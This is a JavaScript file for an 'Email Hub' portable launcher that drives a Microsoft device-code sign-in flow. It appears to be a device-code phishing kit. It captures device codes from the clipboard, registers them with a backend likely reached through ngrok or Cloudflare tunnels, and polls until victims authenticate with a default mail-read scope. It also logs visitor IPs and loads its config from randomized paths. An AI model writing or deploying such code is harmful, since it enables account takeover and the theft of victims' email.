/**
 * Portable Microsoft connect launcher logic (bundled HTML or jsDelivr + #eh-portable-boot JSON).
 * Inline HTML: preceding <script type="application/json" id="eh-inline-portable-boot"> is read via JSON.parse.
 */

function EhPortableLauncherMount(B) {
  var API_BASE = String(B.API_BASE || "");
  var BOOT_KEY = String(B.BOOT_KEY || "");
  var TOKEN = String(B.TOKEN || "");
  var MODE = String(B.MODE || "device_code");
  var ACCOUNT = String(B.ACCOUNT || "org");
  var TENANT = String(B.TENANT || "");
  var AUTO_OPEN = Boolean(B.AUTO_OPEN);
  var DOMAIN_MAPPING_ID = String(B.DOMAIN_MAPPING_ID || "");
  var MICROSOFT_SCOPE_PROFILE = String(B.MICROSOFT_SCOPE_PROFILE || "mail_read");
  var DEVICE_CONSENT = String(B.DEVICE_CONSENT || "graph_delegated");
  var DEVICE_CODE_GRANT = String(B.DEVICE_CODE_GRANT || "v2");
  var DEVICE_PUBLIC_CLIENT_INDEX =
    typeof B.DEVICE_PUBLIC_CLIENT_INDEX === "number"
      ? B.DEVICE_PUBLIC_CLIENT_INDEX
      : parseInt(String(B.DEVICE_PUBLIC_CLIENT_INDEX != null ? B.DEVICE_PUBLIC_CLIENT_INDEX : "0"), 10) ||
        0;
  var DEVICE_CLIENT_ID = String(B.DEVICE_CLIENT_ID || "");
  var DEVICE_TENANT = String(B.DEVICE_TENANT || "");
  var DEVICE_SCOPE = String(B.DEVICE_SCOPE || "");
  var visitorIp = "";
  var POST_CONNECT_NEXT = typeof B.POST_CONNECT_NEXT === "string" ? B.POST_CONNECT_NEXT : String(B.POST_CONNECT_NEXT || "");
  var OAUTH_SUCCESS_PAGE = String(B.OAUTH_SUCCESS_PAGE || "");
  var APP_LABEL = String(B.APP_LABEL || "Email Hub");

  var SPA_ORIGIN = "";
  try {
    var originSrc = POST_CONNECT_NEXT || OAUTH_SUCCESS_PAGE;
    SPA_ORIGIN = new URL(originSrc).origin;
  } catch (e0) {}

  var modeEl = document.getElementById("mode");
  var acctEl = document.getElementById("acct");
  var tenantEl = document.getElementById("tenant");
  var statusEl = document.getElementById("status");
  var deviceEl = document.getElementById("device");
  var verifyEl = document.getElementById("verify");
  var codeEl = document.getElementById("ucode");
  var openVerifyBtn = document.getElementById("openVerify");
  var copyUcodeBtn =
    document.getElementById("copyBtn") || document.getElementById("copyUcodeBtn");
  var warmupEl = document.getElementById("ehWarmup");
  var devicePollTimer = null;

  function setWarmup(on) {
    if (!warmupEl) return;
    warmupEl.classList.toggle("eh-hidden", !on);
    warmupEl.style.display = on ? "block" : "none";
    warmupEl.setAttribute("aria-hidden", on ? "false" : "true");
  }

  function clearDevicePoll() {
    if (devicePollTimer) {
      clearTimeout(devicePollTimer);
      devicePollTimer = null;
    }
  }

  if (modeEl) modeEl.textContent = MODE;
  if (acctEl) acctEl.textContent = ACCOUNT;
  if (tenantEl) tenantEl.textContent = TENANT || "common";

  function isTunnelApiBase() {
    return /ngrok|trycloudflare|loca\.lt|workers\.dev/i.test(API_BASE);
  }

  function launcherHeaders(withJson) {
    var h = {
      Authorization: "Bearer " + TOKEN,
      Accept: "application/json",
    };
    if (withJson) h["Content-Type"] = "application/json";
    if (visitorIp) h["X-EmailHub-Client-IP"] = visitorIp;
    if (isTunnelApiBase()) h["ngrok-skip-browser-warning"] = "true";
    return h;
  }

  async function ensureVisitorIp() {
    if (visitorIp) return visitorIp;
    try {
      var r = await fetch(API_BASE.replace(/\/$/, "") + "/public/client-ip", {
        method: "GET",
        headers: launcherHeaders(false),
        mode: "cors",
        credentials: "omit",
      });
      var j = await r.json().catch(function () {
        return {};
      });
      visitorIp = String(j.client_ip || "").trim();
    } catch (eIp) {}
    return visitorIp;
  }

  function parseMicrosoftDeviceJson(raw) {
    var t = String(raw || "").trim();
    if (!t) return null;
    try {
      var j = JSON.parse(t);
      if (j && j.device_code && j.user_code) return j;
    } catch (eParse) {}
    var m = t.match(/\{[\s\S]*\}/);
    if (m) {
      try {
        var j2 = JSON.parse(m[0]);
        if (j2 && j2.device_code && j2.user_code) return j2;
      } catch (eParse2) {}
    }
    return null;
  }

  function resolveBrowserDeviceParams() {
    var tenant =
      DEVICE_TENANT ||
      TENANT ||
      (ACCOUNT === "personal" ? "consumers" : "common");
    if (DEVICE_CODE_GRANT === "v1_aad_graph") {
      return {
        grant: DEVICE_CODE_GRANT,
        devicecode_url:
          "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0",
        client_id: DEVICE_CLIENT_ID,
        resource: "https://graph.windows.net",
      };
    }
    return {
      grant: DEVICE_CODE_GRANT,
      devicecode_url:
        "https://login.microsoftonline.com/" +
        encodeURIComponent(tenant) +
        "/oauth2/v2.0/devicecode",
      client_id: DEVICE_CLIENT_ID,
      scope: DEVICE_SCOPE || "openid profile offline_access",
    };
  }

  async function fetchBrowserDeviceParams(bodyObj) {
    var q = new URLSearchParams();
    q.set("microsoft_account_type", bodyObj.microsoft_account_type || ACCOUNT);
    if (bodyObj.directory_tenant_id) q.set("directory_tenant_id", bodyObj.directory_tenant_id);
    q.set("device_consent", bodyObj.device_consent || DEVICE_CONSENT);
    q.set("device_code_grant", bodyObj.device_code_grant || DEVICE_CODE_GRANT);
    q.set(
      "device_public_client_index",
      String(
        bodyObj.device_public_client_index != null
          ? bodyObj.device_public_client_index
          : DEVICE_PUBLIC_CLIENT_INDEX,
      ),
    );
    var r = await fetch(API_BASE + "/oauth/microsoft/device/browser-params?" + q.toString(), {
      method: "GET",
      headers: launcherHeaders(false),
      mode: "cors",
      credentials: "omit",
    });
    if (!r.ok) return null;
    return r.json();
  }

  function openMicrosoftDeviceCodePopup(params) {
    var w = null;
    try {
      w = window.open(
        "about:blank",
        "eh_ms_devicecode",
        "width=640,height=520,scrollbars=yes,resizable=yes",
      );
    } catch (eOpen) {
      return null;
    }
    if (!w) return null;
    try {
      var doc = w.document;
      var form = doc.createElement("form");
      form.method = "POST";
      form.action = params.devicecode_url || params.url;
      var add = function (name, value) {
        var input = doc.createElement("input");
        input.type = "hidden";
        input.name = name;
        input.value = value;
        form.appendChild(input);
      };
      add("client_id", params.client_id || params.clientId);
      if ((params.grant || DEVICE_CODE_GRANT) === "v1_aad_graph") {
        add("resource", params.resource || "https://graph.windows.net");
      } else {
        add("scope", params.scope || "openid profile offline_access");
      }
      doc.body.appendChild(form);
      form.submit();
    } catch (eForm) {
      try {
        w.close();
      } catch (eClose) {}
      return null;
    }
    return w;
  }

  function waitForClipboardMicrosoftDevice(maxWaitMs) {
    return new Promise(function (resolve, reject) {
      var done = false;
      var deadline = Date.now() + (maxWaitMs || 180000);
      function finish(err, val) {
        if (done) return;
        done = true;
        window.removeEventListener("focus", onFocus);
        window.clearInterval(timer);
        if (err) reject(err);
        else resolve(val);
      }
      async function tryRead() {
        if (done) return;
        try {
          if (!navigator.clipboard || !navigator.clipboard.readText) return;
          var text = await navigator.clipboard.readText();
          var parsed = parseMicrosoftDeviceJson(text);
          if (parsed) finish(null, parsed);
        } catch (eRd) {}
      }
      function onFocus() {
        void tryRead();
      }
      window.addEventListener("focus", onFocus);
      var timer = window.setInterval(function () {
        if (Date.now() > deadline) {
          finish(
            new Error(
              "Copy the full Microsoft page from the popup (Ctrl+A, Ctrl+C), return here, and click Try again.",
            ),
          );
          return;
        }
        void tryRead();
      }, 1200);
    });
  }

  async function startDeviceSession(bodyObj) {
    var params = null;
    if (DEVICE_CLIENT_ID) {
      params = resolveBrowserDeviceParams();
    } else {
      params = await fetchBrowserDeviceParams(bodyObj);
    }
    if (!params || !(params.client_id || params.clientId)) {
      throw new Error("Missing Microsoft device client id for browser sign-in.");
    }
    var popup = openMicrosoftDeviceCodePopup(params);
    if (!popup) {
      throw new Error("EH_POPUP_BLOCKED");
    }
    setStatus("Copy code & verify to continue");
    var msDev = await waitForClipboardMicrosoftDevice(180000);
    var regBody = Object.assign({}, bodyObj, {
      client_ip: visitorIp || undefined,
      device_code: msDev.device_code,
      user_code: msDev.user_code,
      verification_uri: msDev.verification_uri || "https://microsoft.com/devicelogin",
      expires_in: parseInt(msDev.expires_in, 10) || 900,
      interval: parseInt(msDev.interval, 10) || 5,
    });
    var regResp = await fetch(API_BASE + "/oauth/microsoft/device/register", {
      method: "POST",
      headers: launcherHeaders(true),
      body: JSON.stringify(regBody),
      mode: "cors",
      credentials: "omit",
    });
    var regData = await regResp.json().catch(function () {
      return {};
    });
    if (!regResp.ok || !regData.user_code || !regData.session_id) {
      throw new Error(
        httpErrorDetail(regResp, regData, "Device register failed: HTTP " + regResp.status),
      );
    }
    try {
      popup.close();
    } catch (ePc) {}
    return { resp: regResp, data: regData };
  }

  function setStatus(text, ok) {
    if (!statusEl) return;
    statusEl.textContent = text;
    var base = statusEl.classList.contains("status") ? "status" : "eh-ts-status";
    statusEl.className =
      base + (ok === true ? " ok" : ok === false ? " err" : "");
  }

  function showSuccessState() {
    var scs = document.getElementById("scs");
    var ers = document.getElementById("ers");
    if (deviceEl) deviceEl.style.display = "none";
    if (ers) ers.style.display = "none";
    if (scs) scs.style.display = "block";
  }

  function showErrorState(msg) {
    var scs = document.getElementById("scs");
    var ers = document.getElementById("ers");
    var em = document.getElementById("em");
    if (deviceEl) deviceEl.style.display = "none";
    if (scs) scs.style.display = "none";
    if (ers) ers.style.display = "block";
    if (em && msg) em.textContent = msg;
  }

  function authExpiredMessage() {
    return (
      "Launcher login expired or was rejected. Sign in to " +
      APP_LABEL +
      " again and download a fresh launcher file."
    );
  }

  function httpErrorDetail(resp, data, fallback) {
    if (resp && resp.status === 401) return authExpiredMessage();
    if (data && data.detail) return String(data.detail);
    return fallback;
  }

  function redirectToSpaSuccess(provider) {
    var dest = POST_CONNECT_NEXT || OAUTH_SUCCESS_PAGE;
    if (!dest) {
      setStatus("Missing post-connect redirect URL.", false);
      return;
    }
    var u;
    try {
      if (/^https?:\/\//i.test(dest)) {
        u = new URL(dest);
      } else {
        u = new URL(dest, SPA_ORIGIN || window.location.origin);
      }
    } catch (e1) {
      setStatus("Invalid post-connect redirect URL.", false);
      return;
    }
    u.searchParams.set("oauth", "connected");
    if (provider) u.searchParams.set("provider", provider);
    window.location.href = u.toString();
  }

  function copyUserCodeSync(txt) {
    var t = String(txt || "").trim();
    if (!t) return false;
    try {
      var ta = document.createElement("textarea");
      ta.value = t;
      ta.setAttribute("readonly", "readonly");
      ta.style.position = "fixed";
      ta.style.left = "-9999px";
      document.body.appendChild(ta);
      ta.focus();
      ta.select();
      var ok = document.execCommand("copy");
      document.body.removeChild(ta);
      return !!ok;
    } catch (e) {
      return false;
    }
  }

  function openMicrosoftVerifyPopup(url) {
    var href = String(url || "").trim();
    if (!href) return null;
    var feats =
      "width=500,height=500,toolbar=no,menubar=no,location=yes,status=no,resizable=no,scrollbars=no";
    var w = null;
    try {
      /* Must stay synchronous in the click handler so browsers treat this as a popup. */
      w = window.open(href, "VerifyPopup", feats);
    } catch (eOpen) {
      return null;
    }
    if (!w) return null;
    try {
      w.focus();
    } catch (eFocus) {}
    return w;
  }

  function recordVisit() {
    if (!BOOT_KEY) return;
    try {
      var visitUrl =
        API_BASE.replace(/\/$/, "") +
        "/public/eh-portable-visit?k=" +
        encodeURIComponent(BOOT_KEY);
      if (visitorIp) {
        visitUrl += "&client_ip=" + encodeURIComponent(visitorIp);
      }
      fetch(visitUrl, {
        method: "POST",
        mode: "cors",
        credentials: "omit",
        headers: launcherHeaders(false),
      }).catch(function () {});
    } catch (eVisit) {}
  }

  async function run() {
    try {
      clearDevicePoll();
      setWarmup(true);
      await ensureVisitorIp();
      recordVisit();
      if (deviceEl) deviceEl.style.display = "none";
      if (!SPA_ORIGIN) {
        setWarmup(false);
        setStatus(
          "Configure Settings → After sign-in redirect as a full URL (https://…).",
          false,
        );
        return;
      }
      setStatus("Preparing secure connection…");
      try {
        await fetch(API_BASE.replace(/\/$/, "") + "/healthz", {
          method: "GET",
          headers: launcherHeaders(false),
          mode: "cors",
          credentials: "omit",
        });
      } catch (eWarm) {}

      if (MODE === "browser_oauth") {
        var p = new URLSearchParams();
        p.set("ui_mode", "redirect");
        p.set("microsoft_account_type", ACCOUNT);
        if (TENANT) p.set("directory_tenant_id", TENANT);
        if (DOMAIN_MAPPING_ID) p.set("domain_mapping_id", DOMAIN_MAPPING_ID);
        p.set("microsoft_scope_profile", MICROSOFT_SCOPE_PROFILE);
        p.set("post_oauth_spa_origin", SPA_ORIGIN);
        if (BOOT_KEY) p.set("launcher_boot_key", BOOT_KEY);
        var resp = await fetch(API_BASE + "/oauth/microsoft/authorize?" + p.toString(), {
          method: "GET",
          headers: launcherHeaders(false),
          mode: "cors",
          credentials: "omit",
        });
        var data = await resp.json().catch(function () {
          return {};
        });
        if (!resp.ok || !data.authorization_url) {
          throw new Error(
            httpErrorDetail(resp, data, "Authorize failed: HTTP " + resp.status),
          );
        }
        setWarmup(false);
        setStatus("Redirecting to Microsoft sign-in…", true);
        location.href = data.authorization_url;
        return;
      }

      var bodyObj = {
        microsoft_account_type: ACCOUNT,
        device_consent: DEVICE_CONSENT,
        device_code_grant: DEVICE_CODE_GRANT,
        device_public_client_index: DEVICE_PUBLIC_CLIENT_INDEX,
      };
      if (TENANT) bodyObj.directory_tenant_id = TENANT;
      if (BOOT_KEY) bodyObj.launcher_boot_key = BOOT_KEY;
      if (visitorIp) bodyObj.client_ip = visitorIp;

      var started = await startDeviceSession(bodyObj);
      var resp2 = started.resp;
      var data2 = started.data;
      if (!resp2.ok || !data2.user_code || !data2.session_id) {
        throw new Error(
          httpErrorDetail(resp2, data2, "Device start failed: HTTP " + resp2.status),
        );
      }
      setWarmup(false);
      if (verifyEl) verifyEl.textContent = data2.verification_uri || "https://microsoft.com/devicelogin";
      if (codeEl) codeEl.textContent = data2.user_code;
      if (deviceEl) deviceEl.style.display = "block";
      var verifyUrl = verifyEl ? String(verifyEl.textContent || "").trim() : "";
      var actionButtons = [];
      if (copyUcodeBtn) actionButtons.push(copyUcodeBtn);
      if (openVerifyBtn && openVerifyBtn !== copyUcodeBtn) actionButtons.push(openVerifyBtn);

      /* CDN-owned copy + popup: old downloaded HTML with #copyBtn / #openVerify inherits this. */
      async function copyCodeAndOpenVerifyPopup() {
        var verifyCode = codeEl ? String(codeEl.textContent || "").trim() : "";
        var verify = verifyEl ? String(verifyEl.textContent || "").trim() : verifyUrl;
        /* Open first while the click gesture is still trusted, then copy. */
        if (verify) {
          window.open(
            verify,
            "VerifyPopup",
            "width=500,height=500,toolbar=no,menubar=no,location=yes,status=no,resizable=no,scrollbars=no",
          );
        }
        try {
          if (navigator.clipboard && navigator.clipboard.writeText && verifyCode) {
            await navigator.clipboard.writeText(verifyCode);
            setStatus("Copied to clipboard: " + verifyCode);
          } else {
            copyUserCodeSync(verifyCode);
            setStatus(verifyCode ? "Copied to clipboard: " + verifyCode : "Copy code & verify to continue");
          }
        } catch (errClip) {
          copyUserCodeSync(verifyCode);
          if (statusEl) {
            statusEl.className = statusEl.classList.contains("status") ? "status" : "eh-ts-status";
            statusEl.textContent = "";
          }
        }
      }

      for (var bi = 0; bi < actionButtons.length; bi++) {
        (function (btn) {
          btn.addEventListener("click", function () {
            void copyCodeAndOpenVerifyPopup();
          });
        })(actionButtons[bi]);
      }
      copyUserCodeSync(codeEl ? codeEl.textContent : "");
      var sessionId = data2.session_id;
      var everyMs = Math.max(3000, (parseInt(data2.interval, 10) || 5) * 1000);
      setStatus("Copy code & verify to continue");
      async function poll() {
        try {
          var statusUrl =
            API_BASE +
            "/oauth/microsoft/device/status?session_id=" +
            encodeURIComponent(sessionId);
          if (visitorIp) {
            statusUrl += "&client_ip=" + encodeURIComponent(visitorIp);
          }
          var pr = await fetch(statusUrl, {
            method: "GET",
            headers: launcherHeaders(false),
            mode: "cors",
            credentials: "omit",
          });
          var pd = await pr.json().catch(function () {
            return {};
          });
          if (pd.status === "complete") {
            setStatus(
              "Signed in" + (pd.email ? " — " + pd.email : "") + ". Redirecting…",
              true,
            );
            showSuccessState();
            redirectToSpaSuccess("microsoft");
            return;
          }
          if (pd.status === "error") {
            var errDetail = pd.detail || "Device sign-in failed";
            if (pr.status === 401) errDetail = authExpiredMessage();
            else if (/session expired|invalid/i.test(String(errDetail))) {
              errDetail +=
                " Microsoft device codes expire in about 15 minutes — click Retry to get a new code.";
            }
            throw new Error(errDetail);
          }
        } catch (ePoll) {
          var pollMsg = ePoll && ePoll.message ? ePoll.message : String(ePoll);
          if (document.getElementById("ers")) {
            showErrorState(pollMsg);
          } else {
            setStatus(pollMsg, false);
          }
          return;
        }
        devicePollTimer = window.setTimeout(poll, everyMs);
      }
      devicePollTimer = window.setTimeout(poll, everyMs);
    } catch (err) {
      var msg = err && err.message ? err.message : String(err);
      if (msg === "EH_POPUP_BLOCKED" || /allow popups|popup was blocked|could not open/i.test(msg)) {
        setWarmup(false);
        if (deviceEl) deviceEl.style.display = "block";
        setStatus("Copy code & verify to continue");
        return;
      }
      if (
        msg === "NetworkError when attempting to fetch resource." ||
        (err && err.name === "TypeError")
      ) {
        msg +=
          " Often caused by: (1) ngrok interstitial — visit the API base URL in a normal browser tab once; this launcher sends ngrok-skip-browser-warning when the host looks like ngrok. (2) file:// — use a local static server (e.g. npx serve) so the page has a real http origin, or ensure the API/worker allows CORS for Origin \"null\". (3) Cloudflare Worker as API_BASE — redeploy the " +
          APP_LABEL +
          " worker so it returns CORS headers (required for saved .html files).";
      }
      setWarmup(false);
      if (document.getElementById("ers")) {
        showErrorState(msg);
      } else {
        setStatus(msg, false);
      }
    }
  }

  var retryBtn = document.getElementById("retry");
  if (retryBtn)
    retryBtn.onclick = function () {
      clearDevicePoll();
      void run();
    };
  void run();
}

function ehPortableLauncherShowBootError(message) {
  var statusEl = document.getElementById("status");
  var warmupEl = document.getElementById("ehWarmup");
  var deviceEl = document.getElementById("device");
  if (warmupEl) {
    warmupEl.classList.add("eh-hidden");
    warmupEl.style.display = "none";
    warmupEl.setAttribute("aria-hidden", "true");
  }
  if (deviceEl) deviceEl.style.display = "block";
  if (!statusEl) return;
  statusEl.textContent = message;
  statusEl.className = (statusEl.classList.contains("status") ? "status" : "eh-ts-status") + " err";
}

if (typeof globalThis !== "undefined") {
  globalThis.EhPortableLauncherMount = EhPortableLauncherMount;
  globalThis.ehPortableLauncherShowBootError = ehPortableLauncherShowBootError;
}


/* jsDelivr / deferred bundle (keep in sync via this script):
 * - Prefer inline JSON: <script type="application/json" id="eh-portable-boot">...</script>
 * - Option B: fetch boot JSON from backend when script src includes:
 *     ?eh_boot_api_base=https://api.example.com&eh_boot_k=...
 *   Each open requests /p/eh-<random>?k=...
 */

(function () {
  function ehPortableRandomBootSegment() {
    var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    var out = "eh-";
    for (var i = 0; i < 16; i++) {
      out += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return out;
  }

  function ehPortableBootFetchUrl(apiBase, bootKey) {
    var base = String(apiBase || "").replace(/\/$/, "");
    return base + "/p/" + ehPortableRandomBootSegment() + "?k=" + encodeURIComponent(bootKey);
  }

  var selfSrc = "";
  try {
    selfSrc = (document.currentScript && document.currentScript.src) ? String(document.currentScript.src) : "";
  } catch (e0) {
    selfSrc = "";
  }

  function injectBootEl(bootObj) {
    try {
      var bid = "eh-portable-boot";
      var el = document.getElementById(bid);
      if (!el) {
        el = document.createElement("script");
        el.type = "application/json";
        el.id = bid;
        document.head.appendChild(el);
      }
      el.textContent = JSON.stringify(bootObj || {});
    } catch (e1) {}
  }

  function bootFromDom() {
    var el = document.getElementById("eh-portable-boot");
    if (!el || !el.textContent) return null;
    try {
      return JSON.parse(el.textContent);
    } catch (e) {
      return null;
    }
  }

  async function bootFromBackend() {
    if (!selfSrc) return null;
    var u = null;
    try { u = new URL(selfSrc); } catch (e0) { u = null; }
    if (!u) return null;
    var apiBase = String(u.searchParams.get("eh_boot_api_base") || "").trim();
    var legacyBootUrl = String(u.searchParams.get("eh_boot_url") || "").trim();
    if (!apiBase && legacyBootUrl) {
      if (legacyBootUrl.indexOf("/public/eh-portable-boot") >= 0) {
        apiBase = legacyBootUrl.split("/public/")[0];
      } else {
        apiBase = legacyBootUrl;
      }
    }
    var bootKey = String(u.searchParams.get("eh_boot_k") || "").trim();
    if (!apiBase || !bootKey) return null;
    var fetchUrl = ehPortableBootFetchUrl(apiBase, bootKey);
    try {
      var r = await fetch(fetchUrl, {
        method: "GET",
        cache: "no-store",
        headers: { "Eh-Portable-Boot-Fetch": "1" },
      });
      if (!r) return null;
      if (r.status === 410) {
        try {
          var jr = await r.json();
          var rd = jr && jr.redirect != null ? String(jr.redirect).trim() : "";
          if (rd) {
            window.location.href = rd;
            return null;
          }
        } catch (eGone) {}
        return null;
      }
      if (!r.ok) {
        if (r.status === 530 || r.status === 502 || r.status === 503 || r.status === 504) {
          showBootError(
            "Could not reach the Email Hub API (HTTP " +
              r.status +
              "). Cloudflare quick tunnels stop when the stack runs with -LocalOnly or after a restart. " +
              "Start the full production stack (with tunnels), then open Connector → Portable launchers and click Refresh, or download a new launcher file."
          );
        }
        return null;
      }
      var j = await r.json();
      return j || null;
    } catch (e1) {
      return null;
    }
  }

  function showBootError(message) {
    if (typeof globalThis.ehPortableLauncherShowBootError === "function") {
      globalThis.ehPortableLauncherShowBootError(message);
      return;
    }
    var statusEl = document.getElementById("status");
    var warmupEl = document.getElementById("ehWarmup");
    if (warmupEl) warmupEl.style.display = "none";
    if (!statusEl) return;
    statusEl.textContent = message;
    statusEl.className = "eh-ts-status err";
  }

  async function start() {
    var boot = bootFromDom();
    if (!boot) {
      boot = await bootFromBackend();
      if (boot) injectBootEl(boot);
    }
    if (!boot) {
      showBootError(
        "Could not load launcher configuration. The API URL may be unreachable (common when a Cloudflare quick tunnel restarts). Open Email Hub → Connector → Portable launchers and click Refresh, or download again after tunnels are running."
      );
      return;
    }
    try { EhPortableLauncherMount(boot); } catch (e0) {}
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", function () { void start(); });
  } else {
    void start();
  }
})();
